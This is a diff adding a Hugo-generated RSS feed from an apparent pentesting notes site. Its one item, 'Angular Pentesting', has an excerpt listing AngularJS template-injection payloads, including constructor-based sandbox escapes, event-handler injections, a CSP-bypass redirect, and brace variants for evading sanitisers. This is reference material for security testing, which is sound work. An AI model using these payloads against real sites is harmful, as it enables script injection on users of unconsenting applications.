@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Javascript on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/framework/javascript/</link>
+    <description>Recent content in Javascript on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 16:14:30 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/framework/javascript/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Angular Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</link>
+      <pubDate>Wed, 12 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/</guid>
+      <description>HTML Attributes linkIf a website uses AngularJS framework, the nodes have a “ng-apps” attribute. So you can check it in a HTML source code.&#xA;&amp;lt;div ng-apps&amp;gt; Server-Side Template Injection (SSTI) link {{2*3}} {{$on.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} {{constructor.constructor(&amp;#39;alert(&amp;#34;test&amp;#34;)&amp;#39;)()}} &amp;lt;input ng-focus=$event.view.alert(&amp;#39;test&amp;#39;)&amp;gt; &amp;lt;div ng-app ng-csp&amp;gt;&amp;lt;textarea autofocus ng-focus=&amp;#34;d=$event.view.document;d.location.hash.match(&amp;#39;x1&amp;#39;) ? &amp;#39;&amp;#39; : d.location=&amp;#39;//localhost/mH/&amp;#39;&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/div&amp;gt; It worth testing to bypass sanitizing as below.&#xA;# Remove one-pair braces {2*3} # Remove all braces 2*3 # Add additional braces {{{2*3}}} </description>
+    </item>
+  </channel>
+</rss>
